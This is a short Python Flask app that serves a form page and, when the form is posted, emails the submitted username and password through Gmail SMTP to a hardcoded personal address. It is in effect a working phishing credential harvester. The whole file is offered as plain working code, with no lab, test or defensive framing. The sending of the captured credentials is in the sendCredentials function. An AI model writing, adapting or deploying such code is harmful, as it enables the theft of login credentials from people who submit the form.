from flask import Flask, render_template, request
import smtplib

logic = Flask(__name__)

#Hardcoded email YOUR EMAIL HERE
email = "your_email@eg.com"

@logic.route('/index')
def index():
	return render_template("index.html")

@logic.route('/form_page', methods=['POST', 'GET'])
def formPage():
	if request.method == 'POST':

		#Handle the post request
		username = request.form['username']
		password = request.form['password']

		def sendCredentials(user, password):
			message = "Username: " + user+" "+"Password"+password
			fromaddr = 'kylejamesbehiels@gmail.com'
			toaddrs  = 'kylejamesbehiels@gmail.com'
			username = 'kylejamesbehiels@gmail.com'
			pword = 'ur pwrd'
			server = smtplib.SMTP('smtp.gmail.com:587')
			server.ehlo
			server.starttls()
			server.login(username,pword)
			server.sendmail(fromaddr, toaddrs, message)
			server.quit()

		sendCredentials(username, password)

	else:

		return render_template("simple_form.html")



if __name__ == "__main__":

	logic.run()


